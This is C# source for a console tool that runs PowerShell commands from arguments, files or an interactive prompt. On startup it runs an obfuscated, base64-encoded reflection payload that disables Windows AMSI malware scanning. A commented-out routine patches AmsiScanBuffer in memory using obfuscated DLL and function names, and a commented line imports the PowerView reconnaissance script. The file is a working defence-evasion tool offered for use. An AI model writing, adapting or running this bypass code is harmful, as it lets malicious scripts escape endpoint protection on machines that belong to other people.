using System;
using System.Collections.ObjectModel;
using System.Runtime.InteropServices;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Mono.Options;
using System.IO;

namespace CMLExecutor
{
    public class Executor
    {
        public static string AllChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890.{}[]#';/=-+_";

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        /*
        static int Fhtagn()
        {
            IntPtr Address = GetProcAddress(LoadLibrary(string.Join("", new char[]{
                AllChars.ToCharArray()[0],
                AllChars.ToCharArray()[12],
                AllChars.ToCharArray()[18],
                AllChars.ToCharArray()[8],
                AllChars.ToCharArray()[62],
                AllChars.ToCharArray()[3],
                AllChars.ToCharArray()[11],
                AllChars.ToCharArray()[11],
            })), string.Join("", new char[]{
                AllChars.ToCharArray()[26],
                AllChars.ToCharArray()[12],
                AllChars.ToCharArray()[18],
                AllChars.ToCharArray()[8],
                AllChars.ToCharArray()[44],
                AllChars.ToCharArray()[2],
                AllChars.ToCharArray()[0],
                AllChars.ToCharArray()[13],
                AllChars.ToCharArray()[27],
                AllChars.ToCharArray()[20],
                AllChars.ToCharArray()[5],
                AllChars.ToCharArray()[5],
                AllChars.ToCharArray()[4],
                AllChars.ToCharArray()[17]
            }));

            UIntPtr size = (UIntPtr)5;
            uint p = 0;

            VirtualProtect(Address, size, 0x40, out p);
            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            Marshal.Copy(Patch, 0, Address, 6);
            VirtualProtect(Address, size, p, out _);
            return 0;
        }
        */

        static void Main(string[] args)
        {
            bool show_help = false;
            string cmd = null;

            var options = new OptionSet()
            {
                "Usafe: PowershellviaCSharp.exe [OPTIONS]",
                "Cthulhu fhtagn",
                "If no -c argument is specified, interactive mode is triggered.",
                "",
                "Options:",
                { "c|command=", "The command to be executed.", v => cmd = v },
                { "h|help", "show this message and exit", v => show_help = v != null },
            };

            List<string> extra;

            try
            {
                extra = options.Parse(args);
            }
            catch (OptionException e)
            {
                Console.Write("PowershellviaCSharp: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try `PowershellviaCSharp --help' for more information.");
                return;
            }

            if (extra.Any())
            {
                foreach (var item in extra)
                    Console.WriteLine("Unrecognized Option: {0}", item);
                show_help = true;
            }

            if (show_help)
            {
                options.WriteOptionDescriptions(Console.Out);
                return;
            }

            Runspace run = RunspaceFactory.CreateRunspace();
            run.Open();
            /*
            Console.WriteLine(Fhtagn());
            */
            PowerShell shell = PowerShell.Create();
            shell.Runspace = run;

            /*shell.AddCommand("Import-Module").AddArgument(@"C:\Program Files\PowerView.ps1");
            shell.Invoke();*/
            
            var encoded = "W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi4nKyQoIjQxIDZEIDczIDY5IDU1IDc0IDY5IDZDIDczIi5TcGxpdCgiICIpfGZvckVhY2h7W2NoYXJdKFtjb252ZXJ0XTo6dG9pbnQxNigkXywxNikpfXxmb3JFYWNoeyRyZXN1bHQ9JHJlc3VsdCskX307JHJlc3VsdCkpLkdldEZpZWxkKCQoIjYxIDZEIDczIDY5IDQ5IDZFIDY5IDc0IDQ2IDYxIDY5IDZDIDY1IDY0Ii5TcGxpdCgiICIpfGZvckVhY2h7W2NoYXJdKFtjb252ZXJ0XTo6dG9pbnQxNigkXywxNikpfXxmb3JFYWNoeyRyZXN1bHQyPSRyZXN1bHQyKyRffTskcmVzdWx0MiksJ05vblB1YmxpYyxTdGF0aWMnKS5TZXRWYWx1ZSgkbnVsbCwkdHJ1ZSk=";
            byte[] data = Convert.FromBase64String(encoded);
            string bypsCmd = Encoding.UTF8.GetString(data);

            try
            {
                shell.AddScript(bypsCmd);
                Collection<PSObject> output1 = shell.Invoke();
                foreach (PSObject o in output1)
                {
                    Console.WriteLine(o.ToString());
                }

                foreach (ErrorRecord err in shell.Streams.Error)
                {
                    Console.Write("Error: " + err.ToString());
                }
                shell.Commands.Clear();
                shell.Streams.Error.Clear();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.StackTrace);
            }

            
            if (cmd != null)
            {
                var command = cmd;
                if (cmd.StartsWith("file:"))
                {
                    command = File.ReadAllText(cmd.Replace("file:", ""));
                    Console.WriteLine(command);
                }
                try
                {
                    shell.AddScript(command);
                    Collection<PSObject> output2 = shell.Invoke();
                    Console.WriteLine("Command Output ----- ");
                    foreach (PSObject p in output2)
                    {
                        Console.WriteLine(p.ToString());
                    }

                    foreach (ErrorRecord err in shell.Streams.Error)
                    {
                        Console.Write("Error: " + err.ToString());
                    }
                    shell.Commands.Clear();
                    shell.Streams.Error.Clear();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.StackTrace);
                }
            }
            else
            {
                var running = true;
                while (running)
                {
                    cmd = Console.ReadLine();
                    if (cmd != "exit")
                    {
                        var command = cmd;
                        if (cmd.StartsWith("file:"))
                        {
                            command = File.ReadAllText(cmd.Replace("file:", ""));
                            Console.WriteLine(command);
                        }
                        try
                        {
                            shell.AddScript(command);
                            Collection<PSObject> output3 = shell.Invoke();
                            Console.WriteLine("Command Output ----- ");
                            foreach (PSObject q in output3)
                            {
                                Console.WriteLine(q.ToString());
                            }

                            foreach (ErrorRecord err in shell.Streams.Error)
                            {
                                Console.Write("Error: " + err.ToString());
                            }
                            shell.Commands.Clear();
                            shell.Streams.Error.Clear();
                            Console.WriteLine("Enter New Command: ");
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e.StackTrace);
                        }
                    }
                    else
                    {
                        running = false;
                    }

                }
            }
            run.Close();
        }
    }

}